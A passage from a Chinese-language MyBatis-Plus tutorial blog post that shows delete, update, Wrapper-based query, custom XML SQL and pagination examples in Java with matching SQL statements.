class="comment">//根据id来删除</span></span><br><span class="line">    System.out.println(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testDeleteByMap</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Map&lt;String, Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="comment">//map里面封装的其实是删除的条件</span></span><br><span class="line">    map.put(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;提姆&quot;</span>);</span><br><span class="line">    map.put(<span class="string">&quot;age&quot;</span>,<span class="number">22</span>);<span class="comment">//删除的是name为提姆,age为22的记录</span></span><br><span class="line">    <span class="keyword">int</span> i = userMapper.deleteByMap(map);</span><br><span class="line">    System.out.println(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-3-更新操作"><a href="#4-3-更新操作" class="headerlink" title="4.3 更新操作"></a>4.3 更新操作</h3><p>​    我们可以使用<strong>updateXXX</strong>方法来实现数据的删除。</p>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testUpdate</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//把id为2的用户的年龄改为14</span></span><br><span class="line">    User user = <span class="keyword">new</span> User();</span><br><span class="line">    user.setId(<span class="number">2L</span>);<span class="comment">//因为id是一个long类型的</span></span><br><span class="line">    user.setAge(<span class="number">14</span>);</span><br><span class="line">    <span class="keyword">int</span> i = userMapper.updateById(user);</span><br><span class="line">    System.out.println(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-条件构造器Wrapper"><a href="#5-条件构造器Wrapper" class="headerlink" title="5.条件构造器Wrapper"></a>5.条件构造器Wrapper</h2><h3 id="5-1-概述"><a href="#5-1-概述" class="headerlink" title="5.1 概述"></a>5.1 概述</h3><p>​    我们在实际操作数据库的时候会涉及到很多的条件。所以MP为我们提供了一个功能强大的条件构造器 <code>Wrapper</code> 。使用它可以让我们非常方便的构造条件。</p>
<p>​    其继承体系如下：</p>
<p>​    <img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/wrapper%E7%BB%A7%E6%89%BF%E4%BD%93%E7%B3%BB%E5%9B%BE.png" alt="image-20210823105447044"></p>
<p>​    在其子类<code>AbstractWrapper</code>中提供了很多用于构造Where条件的方法。</p>
<p>​    <code>AbstractWrapper</code>的子类<code>QueryWrapper</code>则额外提供了用于针对Select语法的<code>select</code>方法。可以用来设置查询哪些列。</p>
<p>​    <code>AbstractWrapper</code>的子类<code>UpdateWrapper</code>则额外提供了用于针对SET语法的<code>set</code>方法。可以用来设置对哪些列进行更新。</p>
<p>​    完整的AbstractWrapper方法可以参照：<a href="https://baomidou.com/guide/wrapper.html#abstractwrapper">https://baomidou.com/guide/wrapper.html#abstractwrapper</a></p>
<p>介绍是用来干什么的。它的实现类有哪些</p>
<p>QueryWrapper,UpdateWrapper，【LambdaQueryWrapper】</p>
<h3 id="5-2-常用AbstractWrapper方法"><a href="#5-2-常用AbstractWrapper方法" class="headerlink" title="5.2 常用AbstractWrapper方法"></a>5.2 常用AbstractWrapper方法</h3><blockquote>
<p>eq：equals，等于<br>gt：greater than ，大于 &gt;<br>ge：greater than or equals，大于等于≥<br>lt：less than，小于&lt;<br>le：less than or equals，小于等于≤<br>between：相当于SQL中的BETWEEN<br>like：模糊匹配。like(“name”,”黄”)，相当于SQL的name like ‘%黄%’<br>likeRight：模糊匹配右半边。likeRight(“name”,”黄”)，相当于SQL的name like ‘黄%’<br>likeLeft：模糊匹配左半边。likeLeft(“name”,”黄”)，相当于SQL的name like ‘%黄’<br>notLike：notLike(“name”,”黄”)，相当于SQL的name not like ‘%黄%’<br>isNull<br>isNotNull<br>and：SQL连接符AND<br>or：SQL连接符OR</p>
<p>in: in(“age”,{1,2,3})相当于 age in(1,2,3)</p>
<p>groupBy: groupBy(“id”,”name”)相当于 group by id,name</p>
<p>orderByAsc :orderByAsc(“id”,”name”)相当于 order by id ASC,name ASC</p>
<p>orderByDesc :orderByDesc (“id”,”name”)相当于 order by id DESC,name DESC</p>
</blockquote>
<h4 id="示例一"><a href="#示例一" class="headerlink" title="示例一"></a>示例一</h4><p>SQL语句如下： </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT </span><br><span class="line">	id,user_name,PASSWORD,NAME,age,address </span><br><span class="line">FROM </span><br><span class="line">	USER </span><br><span class="line">WHERE </span><br><span class="line">	age &gt; 18 AND address = &#x27;狐山&#x27;</span><br></pre></td></tr></table></figure>

<p>如果用Wrapper写法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testWrapper01</span><span class="params">()</span></span>&#123;</span><br><span class="line">    QueryWrapper wrapper = <span class="keyword">new</span> QueryWrapper();</span><br><span class="line">    wrapper.gt(<span class="string">&quot;age&quot;</span>,<span class="number">18</span>);</span><br><span class="line">    wrapper.eq(<span class="string">&quot;address&quot;</span>,<span class="string">&quot;狐山&quot;</span>);</span><br><span class="line">    List&lt;User&gt; users = userMapper.selectList(wrapper);</span><br><span class="line">    System.out.println(users);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="示例二"><a href="#示例二" class="headerlink" title="示例二"></a>示例二</h4><p>SQL语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT </span><br><span class="line">	id,user_name,PASSWORD,NAME,age,address </span><br><span class="line">FROM </span><br><span class="line">	USER </span><br><span class="line">WHERE </span><br><span class="line">	id IN(1,2,3) AND </span><br><span class="line">	age BETWEEN 12 AND 29 AND </span><br><span class="line">	address LIKE &#x27;%山%&#x27;</span><br></pre></td></tr></table></figure>



<p>如果用Wrapper写法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testWrapper02</span><span class="params">()</span></span>&#123;</span><br><span class="line">    QueryWrapper&lt;User&gt; wrapper = <span class="keyword">new</span> QueryWrapper&lt;&gt;();</span><br><span class="line">    wrapper.in(<span class="string">&quot;id&quot;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">    wrapper.between(<span class="string">&quot;age&quot;</span>,<span class="number">12</span>,<span class="number">29</span>);</span><br><span class="line">    wrapper.like(<span class="string">&quot;address&quot;</span>,<span class="string">&quot;山&quot;</span>);</span><br><span class="line">    List&lt;User&gt; users = userMapper.selectList(wrapper);</span><br><span class="line">    System.out.println(users);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="示例三"><a href="#示例三" class="headerlink" title="示例三"></a>示例三</h4><p>SQL语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT </span><br><span class="line">	id,user_name,PASSWORD,NAME,age,address </span><br><span class="line">FROM </span><br><span class="line">	USER </span><br><span class="line">WHERE </span><br><span class="line">	id IN(1,2,3) AND </span><br><span class="line">	age &gt; 10 </span><br><span class="line">ORDER BY </span><br><span class="line">	age DESC</span><br></pre></td></tr></table></figure>

<p>如果用Wrapper写法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testWrapper03</span><span class="params">()</span></span>&#123;</span><br><span class="line">    QueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> QueryWrapper&lt;&gt;();</span><br><span class="line">    queryWrapper.in(<span class="string">&quot;id&quot;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">    queryWrapper.gt(<span class="string">&quot;age&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    queryWrapper.orderByDesc(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">    List&lt;User&gt; users = userMapper.selectList(queryWrapper);</span><br><span class="line">    System.out.println(users);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="5-3-常用QueryWrapper方法"><a href="#5-3-常用QueryWrapper方法" class="headerlink" title="5.3 常用QueryWrapper方法"></a>5.3 常用QueryWrapper方法</h3><pre><code> QueryWrapper的 select 可以设置要查询的列。
</code></pre>
<h4 id="示例一-1"><a href="#示例一-1" class="headerlink" title="示例一"></a>示例一</h4><blockquote>
<p>select(String… sqlSelect) 方法的测试为要查询的列名</p>
</blockquote>
<p>SQL语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT </span><br><span class="line">	id,user_name</span><br><span class="line">FROM </span><br><span class="line">	USER </span><br></pre></td></tr></table></figure>

<p>MP写法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSelect01</span><span class="params">()</span></span>&#123;</span><br><span class="line">    QueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> QueryWrapper&lt;&gt;();</span><br><span class="line">    queryWrapper.select(<span class="string">&quot;id&quot;</span>,<span class="string">&quot;user_name&quot;</span>);</span><br><span class="line">    List&lt;User&gt; users = userMapper.selectList(queryWrapper);</span><br><span class="line">    System.out.println(users);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="示例二-1"><a href="#示例二-1" class="headerlink" title="示例二"></a>示例二</h4><blockquote>
<p>select(Class<T> entityClass, Predicate<TableFieldInfo> predicate)</p>
</blockquote>
<p>方法的第一个参数为实体类的字节码对象，第二个参数为Predicate类型，可以使用lambda的写法，过滤要查询的字段 (主键除外) 。</p>
<p>SQL语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT </span><br><span class="line">	id,user_name</span><br><span class="line">FROM </span><br><span class="line">	USER </span><br></pre></td></tr></table></figure>

<p>MP写法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSelect02</span><span class="params">()</span></span>&#123;</span><br><span class="line">    QueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> QueryWrapper&lt;&gt;();</span><br><span class="line">    queryWrapper.select(User.class, <span class="keyword">new</span> Predicate&lt;TableFieldInfo&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">test</span><span class="params">(TableFieldInfo tableFieldInfo)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;user_name&quot;</span>.equals(tableFieldInfo.getColumn());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    List&lt;User&gt; users = userMapper.selectList(queryWrapper);</span><br><span class="line">    System.out.println(users);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="示例三-1"><a href="#示例三-1" class="headerlink" title="示例三"></a>示例三</h4><blockquote>
<p>select(Predicate<TableFieldInfo> predicate)</p>
</blockquote>
<p>方法第一个参数为Predicate类型，可以使用lambda的写法，过滤要查询的字段 (主键除外) 。</p>
<p>SQL语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT </span><br><span class="line">	id,user_name,PASSWORD,NAME,age </span><br><span class="line">FROM </span><br><span class="line">	USER</span><br></pre></td></tr></table></figure>

<p>就是<strong>不查询address</strong>这列，其他列都查询了</p>
<p>MP写法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSelect03</span><span class="params">()</span></span>&#123;</span><br><span class="line">    QueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> QueryWrapper&lt;&gt;(<span class="keyword">new</span> User());</span><br><span class="line">    queryWrapper.select(<span class="keyword">new</span> Predicate&lt;TableFieldInfo&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">test</span><span class="params">(TableFieldInfo tableFieldInfo)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="string">&quot;address&quot;</span>.equals(tableFieldInfo.getColumn());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    List&lt;User&gt; users = userMapper.selectList(queryWrapper);</span><br><span class="line">    System.out.println(users);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h3 id="5-4-常用UpdateWrapper方法"><a href="#5-4-常用UpdateWrapper方法" class="headerlink" title="5.4 常用UpdateWrapper方法"></a>5.4 常用UpdateWrapper方法</h3><p>​        我们前面在使用update方法时需要创建一个实体类对象传入，用来指定要更新的列及对应的值。但是如果需要更新的列比较少时，创建这么一个对象显的有点麻烦和复杂。</p>
<p>​        我们可以使用UpdateWrapper的set方法来设置要更新的列及其值。同时这种方式也可以使用Wrapper去指定更复杂的更新条件。</p>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>SQL语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE </span><br><span class="line">	USER</span><br><span class="line">SET </span><br><span class="line">	age = 99</span><br><span class="line">where </span><br><span class="line">	id &gt; 1</span><br></pre></td></tr></table></figure>

<p>​    我们想把id大于1的用户的年龄修改为99，则可以使用如下写法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testUpdateWrapper</span><span class="params">()</span></span>&#123;</span><br><span class="line">    UpdateWrapper&lt;User&gt; updateWrapper = <span class="keyword">new</span> UpdateWrapper&lt;&gt;();</span><br><span class="line">    updateWrapper.gt(<span class="string">&quot;id&quot;</span>,<span class="number">1</span>);</span><br><span class="line">    updateWrapper.set(<span class="string">&quot;age&quot;</span>,<span class="number">99</span>);</span><br><span class="line">    userMapper.update(<span class="keyword">null</span>,updateWrapper);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h3 id="5-5-Lambda条件构造器"><a href="#5-5-Lambda条件构造器" class="headerlink" title="5.5 Lambda条件构造器"></a>5.5 Lambda条件构造器</h3><p>​    我们前面在使用条件构造器时列名都是用字符串的形式去指定。这种方式无法在编译期确定列名的合法性。</p>
<p>​    所以MP提供了一个Lambda条件构造器可以让我们直接以实体类的方法引用的形式来指定列名。这样就可以弥补上述缺陷。</p>
<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>要执行的查询对应的SQL如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT </span><br><span class="line">	id,user_name,PASSWORD,NAME,age,address </span><br><span class="line">FROM </span><br><span class="line">	USER </span><br><span class="line">WHERE </span><br><span class="line">	age &gt; 18 AND address = &#x27;狐山&#x27;</span><br></pre></td></tr></table></figure>

<p>如果使用之前的条件构造器写法如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testLambdaWrapper</span><span class="params">()</span></span>&#123;</span><br><span class="line">    QueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> QueryWrapper();</span><br><span class="line">    queryWrapper.gt(<span class="string">&quot;age&quot;</span>,<span class="number">18</span>);</span><br><span class="line">    queryWrapper.eq(<span class="string">&quot;address&quot;</span>,<span class="string">&quot;狐山&quot;</span>);</span><br><span class="line">    List&lt;User&gt; users = userMapper.selectList(queryWrapper);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果使用Lambda条件构造器写法如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testLambdaWrapper2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    LambdaQueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> LambdaQueryWrapper&lt;&gt;();</span><br><span class="line">    queryWrapper.gt(User::getAge,<span class="number">18</span>);</span><br><span class="line">    queryWrapper.eq(User::getAddress,<span class="string">&quot;狐山&quot;</span>);</span><br><span class="line">    List&lt;User&gt; users = userMapper.selectList(queryWrapper);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="6-自定义SQL"><a href="#6-自定义SQL" class="headerlink" title="6.自定义SQL"></a>6.自定义SQL</h2><p>​    虽然MP为我们提供了很多常用的方法，并且也提供了条件构造器。但是如果真的遇到了复杂的SQL时，我们还是需要自己去定义方法，自己去写对应的SQL，这样SQL也更有利于后期维护。</p>
<p>​    因为MP是对mybatis做了增强，所以还是支持之前Mybatis的方式去自定义方法。</p>
<p>​    同时也支持在使用Mybatis的自定义方法时使用MP的条件构造器帮助我们进行条件构造。</p>
<p>​    接下去我们分别来讲讲。</p>
<h3 id="6-0-准备工作"><a href="#6-0-准备工作" class="headerlink" title="6.0 准备工作"></a>6.0 准备工作</h3><p>①准备数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE `orders` (</span><br><span class="line">  `id` bigint(20) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `price` int(11) DEFAULT NULL COMMENT &#x27;价格&#x27;,</span><br><span class="line">  `remark` varchar(100) DEFAULT NULL COMMENT &#x27;备注&#x27;,</span><br><span class="line">  `user_id` int(11) DEFAULT NULL COMMENT &#x27;用户id&#x27;,</span><br><span class="line">  `update_time` timestamp NULL DEFAULT NULL COMMENT &#x27;更新时间&#x27;,</span><br><span class="line">  `create_time` timestamp NULL DEFAULT NULL COMMENT &#x27;创建时间&#x27;,</span><br><span class="line">  `version` int(11) DEFAULT &#x27;1&#x27; COMMENT &#x27;版本&#x27;,</span><br><span class="line">  `del_flag` int(1) DEFAULT &#x27;0&#x27; COMMENT &#x27;逻辑删除标识,0-未删除,1-已删除&#x27;,</span><br><span class="line">  `create_by` varchar(100) DEFAULT NULL COMMENT &#x27;创建人&#x27;,</span><br><span class="line">  `update_by` varchar(100) DEFAULT NULL COMMENT &#x27;更新人&#x27;,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;</span><br><span class="line"></span><br><span class="line">/*Data for the table `orders` */</span><br><span class="line"></span><br><span class="line">insert  into `orders`(`id`,`price`,`remark`,`user_id`,`update_time`,`create_time`,`version`,`del_flag`,`create_by`,`update_by`) values (1,2000,&#x27;无&#x27;,2,&#x27;2021-08-24 21:02:43&#x27;,&#x27;2021-08-24 21:02:46&#x27;,1,0,NULL,NULL),(2,3000,&#x27;无&#x27;,3,&#x27;2021-08-24 21:03:32&#x27;,&#x27;2021-08-24 21:03:35&#x27;,1,0,NULL,NULL),(3,4000,&#x27;无&#x27;,2,&#x27;2021-08-24 21:03:39&#x27;,&#x27;2021-08-24 21:03:41&#x27;,1,0,NULL,NULL);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>②创建实体类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Orders</span>  </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 价格</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Integer price;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 备注</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String remark;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用户id</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Integer userId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 更新时间</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> LocalDateTime updateTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建时间</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> LocalDateTime createTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 版本</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Integer version;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 逻辑删除标识,0-未删除,1-已删除</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Integer delFlag;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="6-1-Mybatis方式"><a href="#6-1-Mybatis方式" class="headerlink" title="6.1 Mybatis方式"></a>6.1 Mybatis方式</h3><h4 id="①定义方法"><a href="#①定义方法" class="headerlink" title="①定义方法"></a>①定义方法</h4><p>​    在Mapper接口中定义方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserMapper</span> <span class="keyword">extends</span> <span class="title">BaseMapper</span>&lt;<span class="title">User</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">User <span class="title">findMyUser</span><span class="params">(Long id)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="②创建xml"><a href="#②创建xml" class="headerlink" title="②创建xml"></a>②创建xml</h4><p>​    先配置xml文件的存放目录</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath*:/mapper/**/*.xml</span></span><br></pre></td></tr></table></figure>



<p>​    创建对应的xml映射文件</p>
<h4 id="③在xml映射文件中编写SQL"><a href="#③在xml映射文件中编写SQL" class="headerlink" title="③在xml映射文件中编写SQL"></a>③在xml映射文件中编写SQL</h4><p>​    创建对应的标签，编写对应的SQL语句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE mapper PUBLIC <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span> &gt;</span><br><span class="line">&lt;mapper namespace=<span class="string">&quot;com.sangeng.mapper.UserMapper&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;select id=<span class="string">&quot;findMyUser&quot;</span> resultType=<span class="string">&quot;com.sangeng.domian.User&quot;</span>&gt;</span><br><span class="line">       select * from user where id = #&#123;id&#125; </span><br><span class="line">    &lt;/select&gt;</span><br><span class="line">&lt;/mapper&gt;</span><br></pre></td></tr></table></figure>







<h3 id="6-2-Mybatis方式结合条件构造器"><a href="#6-2-Mybatis方式结合条件构造器" class="headerlink" title="6.2 Mybatis方式结合条件构造器"></a>6.2 Mybatis方式结合条件构造器</h3><p>​    我们在使用上述方式自定义方法时。如果也希望我们的自定义方法能像MP自带方法一样使用条件构造器来进行条件构造的话只需要使用如下方式即可。</p>
<p>①方法定义中添加Warpper类型的参数</p>
<p>添加Warpper类型的参数，并且要注意给其指定参数名。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserMapper</span> <span class="keyword">extends</span> <span class="title">BaseMapper</span>&lt;<span class="title">User</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">User <span class="title">findMyUserByWrapper</span><span class="params">(<span class="meta">@Param(Constants.WRAPPER)</span> Wrapper&lt;User&gt; wrapper)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>②在SQL语句中获取Warpper拼接的SQL片段进行拼接。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findMyUserByWrapper&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.sangeng.domian.User&quot;</span>&gt;</span></span><br><span class="line">    select * from user $&#123;ew.customSqlSegment&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意：不能使用#{}应该用${}</p>
<h2 id="7-分页查询"><a href="#7-分页查询" class="headerlink" title="7.分页查询"></a>7.分页查询</h2><h3 id="7-1-基本分页查询"><a href="#7-1-基本分页查询" class="headerlink" title="7.1 基本分页查询"></a>7.1 基本分页查询</h3><p>①配置分页查询拦截器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PageConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 3.4.0之前的版本</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">   <span class="comment">/* @Bean</span></span><br><span class="line"><span class="comment">    public PaginationInterceptor paginationInterceptor()&#123;</span></span><br><span class="line"><span class="comment">        return  new PaginationInterceptor();</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 3.4.0之后版本</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> MybatisPlusInterceptor <span class="title">mybatisPlusInterceptor</span><span class="params">()</span></span>&#123;</span><br><span class="line">       MybatisPlusInterceptor mybatisPlusInterceptor = <span class="keyword">new</span> MybatisPlusInterceptor();</span><br><span class="line">       mybatisPlusInterceptor.addInnerInterceptor(<span class="keyword">new</span> PaginationInnerInterceptor());</span><br><span class="line">       <span class="keyword">return</span> mybatisPlusInterceptor;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>②进行分页查询</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testPage</span><span class="params">()</span></span>&#123;</span><br><span class="line">    IPage&lt;User&gt; page = <span class="keyword">new</span> Page&lt;&gt;();</span><br><span class="line">    <span class="comment">//设置每页条数</span></span><br><span class="line">    page.setSize(<span class="number">2</span>);</span><br><span class="line">    <span class="comment">//设置查询第几页</span></span><br><span class="line">    page.setCurrent(<span class="number">1</span>);</span><br><span class="line">    userMapper.selectPage(page, <span class="keyword">null</span>);</span><br><span class="line">    System.out.println(page.getRecords());<span class="comment">//获取当前页的数据</span></span><br><span class="line">    System.out.println(page.getTotal());<span class="comment">//获取总记录数</span></span><br><span class="line">    System.out.println(page.getCurrent());<span class="comment">//当前页码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="继承Iservice接口"><a href="#继承Iservice接口" class="headerlink" title="继承Iservice接口"></a>继承Iservice接口</h5><p><a href="#service">继承Iservice接口</a>后则更简单,同时可以很好的配合restful风格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;/page&#123;p&#125;&quot;)</span><br><span class="line">    public ResponseResult page(@PathVariable(&quot;p&quot;)Integer p)&#123;</span><br><span class="line">        IPage&lt;User&gt; page=new Page&lt;&gt;();</span><br><span class="line">        page.setSize(10);</span><br><span class="line">        page.setCurrent(p);</span><br><span class="line">        userService.page(page,null);</span><br><span class="line">        return new ResponseResult(200,&quot;这是第&quot;+p+&quot;页用户&quot;,page.getRecords());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>







<h3 id="7-2-多表分页查询"><a href="#7-2-多表分页查询" class="headerlink" title="7.2 多表分页查询"></a>7.2 多表分页查询</h3><p>​    如果需要在多表查询时进行分页查询的话，就可以在mapper接口中自定义方法，然后让方法接收Page对象。</p>
<h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h4><h5 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h5><p>​    我们需要去查询Orders表，并且要求查询的时候除了要获取到Orders表中的字段，还要获取到每个订单的下单用户的用户名。</p>
